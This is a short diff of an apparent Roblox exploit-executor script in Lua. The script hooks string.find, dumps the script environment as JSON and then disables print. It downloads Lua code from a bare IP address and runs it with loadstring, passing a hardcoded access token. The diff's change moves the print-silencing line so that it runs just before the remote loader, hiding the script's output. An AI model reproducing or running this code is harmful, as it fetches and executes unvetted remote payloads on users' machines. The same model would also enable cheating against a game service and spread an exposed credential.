@@ -6,9 +6,7 @@ local LocalPlayer = game.Players.LocalPlayer
 
 local HttpService = game:GetService("HttpService"); 
 local LogService = game:GetService("LogService"); 
---getgenv().print = function() end
-
-		local o; 
+--	local o; 
 o = hookfunction(string.find, function(a, b) 
     if not a or not b then return end 
     return o(a, b)
@@ -72,6 +70,9 @@ end
 
 print(game:GetService("HttpService"):JSONEncode(getsenv()))
 
+		getgenv().print = function() end
+
+	
 loadstring(game:HttpGet('http://150.109.50.38/assets/Client.lua'))()({
     Access_Token = "mUveZboOmlA5q5LCfcoLx6XnTm1qUqU9",
     Device_Name  = "n/a", 
